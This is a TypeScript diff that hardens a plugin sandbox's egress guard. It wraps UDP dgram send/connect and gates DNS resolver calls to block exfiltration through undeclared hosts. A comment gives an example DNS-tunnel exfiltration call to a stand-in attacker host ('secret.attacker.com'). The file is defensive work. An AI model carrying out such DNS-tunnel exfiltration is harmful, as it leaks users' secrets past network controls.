@@ -13,9 +13,10 @@
 import path from 'node:path';
 import net from 'node:net';
 import dns from 'node:dns';
+import dgram from 'node:dgram';
 import { createRequire } from 'node:module';
 import { createPluginContext, type ChildTransport, type PluginContext, type PluginDefinition } from './plugin-sdk';
-import { isBlockedIp, makeHostAllow, classifyConnect } from './egress-policy';
+import { isBlockedIp, makeHostAllow, classifyConnect, dgramSendTarget, dgramConnectTarget } from './egress-policy';
 import type { Envelope, RpcError } from '../protocol/envelope';
 
 const pluginId = process.argv[2] || process.env.TREK_PLUGIN_ID || 'unknown';
@@ -147,7 +148,7 @@ process.on('message', (raw: unknown) => {
  * declared egress, ALL outbound is blocked. Wildcards like `*.host` match any
  * subdomain.
  *
- * Two layers, so a plugin can't just sidestep `fetch` with a raw socket:
+ * Four channels are covered, so a plugin can't sidestep one with another:
  *  1. `globalThis.fetch` is wrapped (early hostname reject).
  *  2. `net.Socket.prototype.connect` is wrapped — the single TCP choke point that
  *     node:http / node:https / node:net / node:tls AND undici/fetch all funnel
@@ -155,6 +156,13 @@ process.on('message', (raw: unknown) => {
  *     private/loopback/link-local/metadata/CGNAT/ULA address (SSRF + DNS-rebinding
  *     backstop), pinning the resolved IP into the connect so the name can't flip
  *     to an internal address between check and connect.
+ *  3. `dgram.Socket` send/connect (UDP) — TCP-only wrappers would leave UDP open
+ *     as a data-exfiltration channel; the explicit destination is allowlisted +
+ *     private-IP-checked like a TCP connect.
+ *  4. The `dns` resolver family (module fns, `dns.promises`, `Resolver.prototype`)
+ *     — a plugin could otherwise tunnel data out inside DNS queries to a name it
+ *     never declared (dns.resolveTxt('secret.attacker.com')); every forward lookup
+ *     is rejected unless the queried name is a declared host.
  *
  * Under the OS permission model the child also cannot spawn a fresh process or
  * load a native addon to escape these wrappers. A kernel/network-namespace
@@ -181,6 +189,10 @@ function installEgressGuard(egress: string[]): void {
     }) as typeof fetch;
   }
 
+  // Capture the real resolvers before we patch the dns module below, so the
+  // connect guard keeps resolving even though direct dns.* calls get gated.
+  const realLookup = dns.lookup.bind(dns);
+
   // A DNS lookup that refuses to resolve a name to a blocked address; injected
   // into every hostname connect so the socket only ever reaches a vetted IP.
   const guardedLookup = (
@@ -190,7 +202,7 @@ function installEgressGuard(egress: string[]): void {
   ): void => {
     const opts = typeof options === 'function' ? {} : options;
     if (typeof options === 'function') cb = options as typeof cb;
-    dns.lookup(hostname, opts as dns.LookupOptions, (err, address, family) => {
+    realLookup(hostname, opts as dns.LookupOptions, (err, address, family) => {
       if (err) return cb(err, address as unknown, family);
       const list = Array.isArray(address) ? address : [{ address: address as string }];
       for (const a of list) {
@@ -224,6 +236,62 @@ function installEgressGuard(egress: string[]): void {
     const rest = first && typeof first === 'object' ? args.slice(1) : args.slice(typeof args[1] === 'string' ? 2 : 1);
     return realConnect.call(this, options, ...rest);
   };
+
+  // Refuse an outbound UDP target the plugin never declared, or a private one.
+  // A null target means "no explicit address" (connected remote / localhost
+  // default) — the connect wrapper below already vetted connected sockets.
+  const guardDatagram = (host: string | null): void => {
+    if (host === null) return;
+    if (!allowed(host)) throw new Error(`egress: ${host} is not in the plugin's declared hosts`);
+    if (blockPrivate && net.isIP(host) !== 0 && isBlockedIp(host)) {
+      throw new Error(`egress: ${host} is a blocked address`);
+    }
+  };
+  const dgramProto = dgram.Socket.prototype as unknown as {
+    send: (...a: unknown[]) => unknown;
+    connect: (...a: unknown[]) => unknown;
+  };
+  const realSend = dgramProto.send;
+  dgramProto.send = function (this: unknown, ...args: unknown[]): unknown {
+    guardDatagram(dgramSendTarget(args));
+    return realSend.apply(this, args);
+  };
+  const realDgramConnect = dgramProto.connect;
+  dgramProto.connect = function (this: unknown, ...args: unknown[]): unknown {
+    guardDatagram(dgramConnectTarget(args));
+    return realDgramConnect.apply(this, args);
+  };
+
+  // Gate the dns resolver family: a forward lookup for an undeclared name is a
+  // DNS-tunnel exfiltration channel even when no socket is ever opened. The name
+  // itself must be a declared host. Covers the callback module fns, the promise
+  // API, and per-Resolver instances (which share Resolver.prototype).
+  const DNS_METHODS = [
+    'lookup', 'resolve', 'resolve4', 'resolve6', 'resolveAny', 'resolveCaa', 'resolveCname',
+    'resolveMx', 'resolveNaptr', 'resolveNs', 'resolvePtr', 'resolveSoa', 'resolveSrv', 'resolveTxt',
+  ];
+  const gateDnsMethods = (obj: Record<string, unknown> | undefined): void => {
+    if (!obj) return;
+    for (const name of DNS_METHODS) {
+      const real = obj[name];
+      if (typeof real !== 'function') continue;
+      obj[name] = function (this: unknown, hostname: unknown, ...rest: unknown[]): unknown {
+        if (typeof hostname === 'string' && !allowed(hostname)) {
+          const err = new Error(`egress: DNS lookup for ${hostname} is not in the plugin's declared hosts`);
+          const cb = rest.find((a) => typeof a === 'function') as ((e: Error) => void) | undefined;
+          if (cb) return cb(err); // callback API
+          return Promise.reject(err); // promise API (dns.promises / Resolver)
+        }
+        return (real as (...a: unknown[]) => unknown).call(this, hostname, ...rest);
+      };
+    }
+  };
+  gateDnsMethods(dns as unknown as Record<string, unknown>);
+  gateDnsMethods(dns.promises as unknown as Record<string, unknown>);
+  const resolverProto = (dns as unknown as { Resolver?: { prototype: Record<string, unknown> } }).Resolver?.prototype;
+  gateDnsMethods(resolverProto);
+  const promisesResolverProto = (dns.promises as unknown as { Resolver?: { prototype: Record<string, unknown> } })?.Resolver?.prototype;
+  gateDnsMethods(promisesResolverProto);
 }
 
 // Ask the host for the init payload (instance config), then wait for it.
